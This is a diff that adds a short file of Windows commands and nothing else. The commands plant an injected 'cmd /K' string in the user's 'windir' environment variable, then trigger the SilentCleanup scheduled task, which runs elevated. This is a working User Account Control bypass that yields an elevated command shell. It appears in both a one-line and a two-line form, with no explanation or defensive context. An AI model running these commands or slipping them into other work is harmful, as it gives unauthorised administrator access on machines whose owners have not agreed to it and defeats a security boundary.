@@ -1,0 +1,14 @@
+
+reg add hkcu\Environment /v windir /d "cmd /K reg delete hkcu\Environment /v windir /f && REM " & schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+
+
+
+
+reg add hkcu\Environment /v windir /d "cmd /K reg delete hkcu\Environment /v windir /f && REM "
+
+schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+
+
+
